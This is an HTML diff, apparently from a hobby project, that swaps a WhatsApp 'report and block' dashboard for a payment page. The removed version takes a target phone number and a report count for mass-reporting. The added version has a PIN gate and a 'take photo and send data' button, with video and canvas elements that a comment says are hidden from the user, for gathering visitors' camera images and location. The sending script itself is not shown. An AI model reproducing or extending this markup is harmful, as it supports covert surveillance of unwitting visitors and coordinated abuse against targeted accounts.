@@ -3,311 +3,270 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Kepforannas Repot - Dashboard Bot WA</title>
+<title>Kepfotannas - Pembayaran & Data Pengunjung</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-  
-  :root {
-    --primary-color: #6a11cb;
-    --secondary-color: #2575fc;
-    --card-bg: rgba(255, 255, 255, 0.1);
-    --input-bg: rgba(255, 255, 255, 0.2);
-    --border-color: rgba(255, 255, 255, 0.3);
-    --text-color: #e0e0e0;
-    --log-bg: rgba(0, 0, 0, 0.5);
-    --log-text: #00ff6a;
-    --success-color: #00ff6a;
-    --error-color: #ff3b5b;
-    --warning-color: #ffc107;
-  }
-  
-  * {
+  /* Reset */
+  *, *::before, *::after {
     box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-    font-family: 'Inter', sans-serif;
   }
-  
+  html, body {
+    margin: 0; padding: 0;
+    height: 100%;
+    font-family: 'Poppins', sans-serif;
+    background: linear-gradient(135deg, #001f3f, #004080, #003366);
+    color: #cce6ff;
+    user-select: none;
+    overflow-x: hidden;
+  }
   body {
-    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-    color: var(--text-color);
+    display: flex;
+    flex-direction: column;
     min-height: 100vh;
+  }
+  main {
+    flex: 1;
+    max-width: 400px;
+    margin: 0 auto;
+    padding: 2rem 1rem 4rem;
     display: flex;
+    flex-direction: column;
     align-items: center;
-    justify-content: center;
-    padding: 20px;
-    overflow-y: auto;
-    animation: backgroundMove 20s infinite alternate;
   }
-  
-  @keyframes backgroundMove {
-    0% { background-position: 0% 50%; }
-    100% { background-position: 100% 50%; }
-  }
-  
-  .dashboard-container {
-    width: 100%;
-    max-width: 600px;
-    background: var(--card-bg);
-    border-radius: 20px;
-    padding: 30px;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-    backdrop-filter: blur(10px);
-    border: 1px solid var(--border-color);
-    animation: fadeIn 1s ease-in-out;
-  }
-  
-  @keyframes fadeIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-  
-  .header {
-    text-align: center;
-    margin-bottom: 25px;
-  }
-  
-  .logo svg {
-    width: 64px;
-    height: 64px;
-    filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.7));
-    animation: bounceIn 1s ease-in-out;
-  }
-  
-  @keyframes bounceIn {
-    0% { transform: scale(0); opacity: 0; }
-    60% { transform: scale(1.1); opacity: 1; }
-    80% { transform: scale(0.9); }
-    100% { transform: scale(1); }
-  }
-  
   h1 {
-    font-size: 2.5rem;
-    color: #fff;
-    text-shadow: 2px 2px 6px rgba(0,0,0,0.4);
-    margin-top: 10px;
-  }
-  
-  h2 {
-    font-weight: 400;
-    color: rgba(255,255,255,0.7);
-    margin-top: 5px;
-  }
-  
-  .section {
-    margin-bottom: 30px;
-  }
-  
-  .section-title {
-    font-size: 1.3rem;
-    font-weight: 700;
-    margin-bottom: 15px;
-    color: #fff;
-    border-bottom: 2px solid var(--border-color);
-    padding-bottom: 6px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  
-  .section-title svg {
-    stroke: #fff;
-    stroke-width: 2;
-  }
-  
-  label {
-    display: block;
-    margin-bottom: 8px;
-    font-weight: 600;
-    color: rgba(255, 255, 255, 0.9);
-  }
-  
-  input, button {
-    width: 100%;
-    padding: 14px;
-    margin-top: 6px;
-    border-radius: 12px;
-    border: 1px solid var(--border-color);
-    font-size: 16px;
-    background: var(--input-bg);
-    color: var(--text-color);
-    transition: all 0.3s ease;
-  }
-  
-  input::placeholder {
-    color: rgba(255, 255, 255, 0.6);
-  }
-  
-  input:focus {
-    background: rgba(255, 255, 255, 0.3);
-    border-color: #fff;
-    outline: none;
-    box-shadow: 0 0 15px rgba(37, 117, 252, 0.7);
-  }
-  
-  button {
-    cursor: pointer;
-    background: linear-gradient(90deg, var(--secondary-color), var(--primary-color));
-    border: none;
-    font-weight: 700;
-    box-shadow: 0 6px 25px rgba(0,0,0,0.4);
-    text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
-    animation: shine 2.5s infinite;
-    margin-top: 15px;
-  }
-  
-  button:hover {
-    background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-    box-shadow: 0 8px 30px rgba(0,0,0,0.5);
-    transform: translateY(-3px);
-  }
-  
-  @keyframes shine {
-    0% { filter: brightness(1); }
-    50% { filter: brightness(1.2); }
-    100% { filter: brightness(1); }
-  }
-  
-  .status-info {
-    margin-top: 15px;
+    font-size: 3rem;
+    margin-bottom: 0.3rem;
+    color: #00bfff;
+    text-shadow:
+      0 0 10px #00bfff,
+      0 0 20px #00bfff,
+      0 0 30px #00bfff;
+    animation: neonPulse 3s ease-in-out infinite alternate;
+    letter-spacing: 2px;
+    user-select: text;
     text-align: center;
+  }
+  p.subtitle {
+    font-size: 1.3rem;
+    margin-bottom: 2rem;
+    color: #66ccffcc;
+    text-shadow: 0 0 8px #66ccffaa;
+    user-select: text;
+    text-align: center;
+  }
+  @keyframes neonPulse {
+    0% {
+      text-shadow:
+        0 0 10px #00bfff,
+        0 0 20px #00bfff,
+        0 0 30px #00bfff;
+    }
+    100% {
+      text-shadow:
+        0 0 15px #00bfff,
+        0 0 30px #00bfff,
+        0 0 50px #00bfff;
+    }
+  }
+  .payment-info {
+    background: rgba(0, 191, 255, 0.15);
+    border-radius: 1rem;
+    padding: 1.5rem 2rem;
+    width: 100%;
+    box-shadow: 0 0 20px #00bfff88;
+    user-select: text;
+    margin-bottom: 2rem;
+  }
+  .payment-info h2 {
+    margin-top: 0;
+    color: #00e5ff;
+    text-shadow: 0 0 8px #00e5ff;
+    font-weight: 600;
+    font-size: 1.8rem;
+  }
+  .payment-info p {
+    font-size: 1.1rem;
+    margin: 0.5rem 0;
+    line-height: 1.4;
+  }
+  .payment-info .number {
     font-weight: 700;
-    padding: 15px;
-    border-radius: 12px;
-    border: 1px solid var(--border-color);
-    transition: all 0.5s ease;
-    animation: popIn 0.5s ease-out;
+    font-size: 1.4rem;
+    letter-spacing: 0.1em;
+    user-select: all;
+  }
+  .copy-btn {
+    background: linear-gradient(90deg, #0099ff, #00bfff);
+    border: none;
+    border-radius: 1rem;
+    color: #cce6ff;
+    font-weight: 700;
+    font-size: 1rem;
+    padding: 0.5rem 1.2rem;
+    cursor: pointer;
+    box-shadow: 0 0 15px #00bfffcc, 0 0 30px #00bfffbb;
+    margin-left: 1rem;
+    transition: background 0.3s ease, box-shadow 0.3s ease;
     user-select: none;
   }
-  
-  .status-info.connected { 
-    background: rgba(0, 255, 106, 0.2);
-    color: var(--success-color); 
-    border-color: var(--success-color);
+  .copy-btn:hover, .copy-btn:focus {
+    background: linear-gradient(90deg, #00bfff, #0099ff);
+    box-shadow: 0 0 30px #00bfffee, 0 0 60px #00bfffee;
+    outline: none;
   }
-  .status-info.disconnected { 
-    background: rgba(255, 59, 91, 0.2);
-    color: var(--error-color); 
-    border-color: var(--error-color);
+  .links {
+    display: flex;
+    justify-content: center;
+    gap: 2rem;
+    margin-bottom: 2rem;
   }
-  .status-info.connecting { 
-    background: rgba(255, 193, 7, 0.2);
-    color: var(--warning-color); 
-    border-color: var(--warning-color);
-  }
-  
-  @keyframes popIn {
-    from { transform: scale(0.8); opacity: 0; }
-    to { transform: scale(1); opacity: 1; }
-  }
-  
-  .log-container {
-    margin-top: 30px;
-  }
-  
-  #logArea {
-    width: 100%;
-    height: 220px;
-    background: var(--log-bg);
-    color: var(--log-text);
-    font-family: 'Courier New', monospace;
-    padding: 15px;
-    border-radius: 12px;
-    resize: none;
-    border: 1px solid rgba(0, 255, 106, 0.3);
-    transition: all 0.3s ease;
-  }
-  
-  .result-message {
-    margin-top: 15px;
-    text-align: center;
+  .links a {
+    color: #00bfff;
     font-weight: 600;
-    color: var(--text-color);
-    animation: slideIn 0.5s ease-out;
+    font-size: 1.2rem;
+    text-decoration: none;
+    text-shadow: 0 0 5px #00bfffaa;
+    transition: color 0.3s ease;
+    user-select: text;
   }
-  
-  @keyframes slideIn {
-    from { transform: translateY(10px); opacity: 0; }
-    to { transform: translateY(0); opacity: 1; }
+  .links a:hover, .links a:focus {
+    color: #00e5ff;
+    text-shadow: 0 0 15px #00e5ff;
+    outline: none;
   }
-  
-  .divider {
+  .btn {
+    background: linear-gradient(90deg, #0099ff, #00bfff);
     border: none;
-    height: 1px;
-    background: var(--border-color);
-    margin: 30px 0;
+    border-radius: 1.3rem;
+    color: #cce6ff;
+    font-weight: 700;
+    font-size: 1.15rem;
+    padding: 16px 0;
+    width: 100%;
+    max-width: 280px;
+    margin: 0 auto 1.5rem;
+    cursor: pointer;
+    box-shadow: 0 0 15px #00bfffcc, 0 0 30px #00bfffbb;
+    position: relative;
+    overflow: hidden;
+    letter-spacing: 1.2px;
+    text-shadow: 0 0 5px #00bfffaa;
+    transition: background 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
+    user-select: none;
   }
-
-  @media (max-width: 600px) {
-    .dashboard-container {
-      padding: 20px;
-    }
+  .btn:hover, .btn:focus {
+    background: linear-gradient(90deg, #00bfff, #0099ff);
+    box-shadow: 0 0 30px #00bfffee, 0 0 60px #00bfffee;
+    transform: scale(1.07);
+    outline: none;
+    color: #e0f7ff;
+    z-index: 1;
+  }
+  #status {
+    text-align: center;
+    margin-top: 1rem;
+    font-weight: 600;
+    color: #00d4ff;
+    user-select: text;
+    min-height: 1.5em;
+    font-size: 1.1rem;
+  }
+  footer {
+    margin-top: auto;
+    font-size: 0.9rem;
+    color: #66ccffaa;
+    text-align: center;
+    user-select: none;
+    letter-spacing: 0.5px;
+    text-shadow: 0 0 5px #00bfff88;
+    padding: 1rem 0;
+  }
+  /* PIN overlay */
+  #pinOverlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.95);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    user-select: none;
+  }
+  #pinOverlay[hidden] {
+    display: none;
+  }
+  #pinOverlay h2 {
+    color: #00bfff;
+    text-shadow: 0 0 10px #00bfff;
+    margin-bottom: 1rem;
+    font-size: 2rem;
+    text-align: center;
+  }
+  #pinInput {
+    font-size: 2rem;
+    padding: 0.5rem 1rem;
+    border-radius: 0.8rem;
+    border: none;
+    width: 180px;
+    text-align: center;
+    letter-spacing: 0.3em;
+    background: #003366;
+    color: #00bfff;
+    box-shadow: 0 0 10px #00bfff;
+  }
+  #pinInput:focus {
+    outline: none;
+    box-shadow: 0 0 20px #00e5ff;
+  }
+  #pinError {
+    color: #ff5555;
+    margin-top: 0.8rem;
+    font-weight: 600;
+    min-height: 1.2em;
+    text-align: center;
   }
 </style>
 </head>
 <body>
-  <div class="dashboard-container" role="main" aria-label="Dashboard Bot WhatsApp">
-    <header class="header">
-      <div class="logo" aria-hidden="true">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="color: #25D366;">
-          <path d="M12.04 2.87c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95l-1.39 5.06 5.21-1.37c1.47.8 3.16 1.25 4.77 1.25 5.46 0 9.91-4.45 9.91-9.91s-4.45-9.91-9.91-9.91zM17.43 15.68c-.14.24-.29.27-.47.45-.18.18-.36.2-.55.12-.2-.08-.55-.22-1.07-.47-.52-.26-.88-.39-1.24-.48-.36-.08-.75-.08-1.12.08-.37.17-.47.28-.6.45-.14.17-.28.36-.4.49-.12.14-.26.29-.44.36-.18.08-.4.04-.6-.08-.2-.12-.47-.29-.73-.42-.26-.14-.52-.27-.7-.41-.18-.14-.37-.34-.52-.51-.14-.17-.27-.37-.36-.55-.08-.18-.12-.34-.12-.45-.04-.12-.04-.2-.04-.29 0-.09-.04-.17-.04-.25s0-.18.04-.24.12-.22.25-.37.28-.32.42-.48.3-.34.39-.55c.08-.2.12-.36.12-.55.04-.19 0-.32-.1-.45s-.37-.25-.6-.5c-.24-.22-.52-.3-.68-.3-.16 0-.36-.04-.52-.04-.16 0-.37 0-.57.08-.2.08-.47.22-.7.42s-.34.45-.45.69-.17.5-.17.7-.02.39 0 .6.12.51.27.76.36.42.52.54.43.34.69.45.6.25 1.2.49c.5.21 1.05.42 1.58.62.53.2 1.05.37 1.55.51.5.15 1.05.27 1.55.33.5.06 1.05.02 1.55-.17.5-.19.87-.51 1.07-.8.2-.29.3-.58.33-.87.03-.29-.08-.58-.19-.77z"/>
-        </svg>
-      </div>
-      <h1>Kepforannas Repot</h1>
-      <h2>Dashboard Bot WhatsApp</h2>
-    </header>
-    
-    <section class="section" aria-labelledby="status-title">
-      <h3 id="status-title" class="section-title">
-        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true" width="24" height="24">
-          <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></polygon>
-        </svg>
-        Status Bot
-      </h3>
-      <p id="status" class="status-info disconnected" aria-live="polite">Status: Terputus</p>
-    </section>
 
-    <hr class="divider" />
+<main>
+  <h1>💳 Kepfotannas</h1>
+  <p class="subtitle">Pembayaran Premium & Data Pengunjung dengan Kamera & Lokasi</p>
 
-    <section class="section" aria-labelledby="report-title">
-      <h3 id="report-title" class="section-title">
-        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true" width="24" height="24">
-          <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-          <line x1="12" y1="9" x2="12" y2="13" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></line>
-          <line x1="12" y1="17" x2="12" y2="17" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></line>
-        </svg>
-        Kirim Report & Blokir
-      </h3>
-      <label for="targetNumber">Nomor Target (contoh: 6289876543210)</label>
-      <input id="targetNumber" type="tel" inputmode="numeric" pattern="[0-9]+" placeholder="Masukkan nomor target" autocomplete="off" required />
+  <section class="payment-info" aria-label="Informasi Pembayaran">
+    <h2>Metode Pembayaran</h2>
+    <p>
+      <strong>Dana & GoPay:</strong>
+      <span class="number" id="paymentNumber">6283173814168</span>
+      <button class="copy-btn" id="copyBtn" aria-label="Salin nomor pembayaran">📋 Salin</button>
+    </p>
+    <p><small>Nomor di atas dapat digunakan untuk Dana dan GoPay.</small></p>
+  </section>
 
-      <label for="reportTimes">Jumlah Report</label>
-      <input id="reportTimes" type="number" min="1" max="50" value="5" required />
+  <nav class="links" aria-label="Tautan Sosial Media">
+    <a href="https://www.tiktok.com/@kepforannas7hs" target="_blank" rel="noopener" aria-label="TikTok kepforannas7hs">TikTok @kepforannas7hs</a>
+    <a href="https://t.me/kepforannas7hs" target="_blank" rel="noopener" aria-label="Telegram kepforannas7hs">Telegram @kepforannas7hs</a>
+  </nav>
 
-      <button id="btnReport" type="button" aria-label="Kirim Report dan Blokir Nomor">Kirim Report & Blokir</button>
-      <p id="reportResult" class="result-message" aria-live="polite"></p>
-    </section>
-    
-    <hr class="divider" />
+  <button class="btn" id="startBtn" aria-live="polite" aria-busy="false" aria-label="Ambil foto dan kirim data">Ambil Foto & Kirim Data</button>
 
-    <section class="log-container" aria-labelledby="log-title">
-      <h3 id="log-title" class="section-title">
-        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true" width="24" height="24">
-          <polyline points="4 17 10 17 10 21" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></polyline>
-          <line x1="4" y1="4" x2="20" y2="4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></line>
-          <line x1="4" y1="8" x2="20" y2="8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></line>
-          <line x1="4" y1="12" x2="20" y2="12" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></line>
-          <polyline points="12 19 14 21 18 17" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></polyline>
-        </svg>
-        Log Aktivitas
-      </h3>
-      <textarea id="logArea" readonly aria-label="Log aktivitas bot"></textarea>
-    </section>
-  </div>
+  <!-- Video dan canvas disembunyikan, tidak tampil ke user -->
+  <video id="video" autoplay playsinline muted style="display:none;"></video>
+  <canvas id="canvas" aria-hidden="true" style="display:none;"></canvas>
 
-  <!-- Socket.io client -->
-  <script src="/socket.io/socket.io.js"></script>
-  <!-- Import index.js yang berisi logic frontend -->
-  <script src="index.js"></script>
+  <div id="status" role="status" aria-live="polite"></div>
+</main>
+
+<footer>&copy; 2025 Kepfotannas Payment System</footer>
+
+<!-- PIN Overlay -->
+<div id="pinOverlay" role="dialog" aria-modal="true" aria-labelledby="pinTitle" >
+  <h2 id="pinTitle">Masukkan PIN untuk melanjutkan</h2>
+  <input type="password" id="pinInput" maxlength="5" inputmode="numeric" autocomplete="one-time-code" aria-describedby="pinError" aria-label="Input PIN" />
+  <div id="pinError" aria-live="assertive"></div>
+</div>
+
+<script src="index.js"></script>
 </body>
 </html>
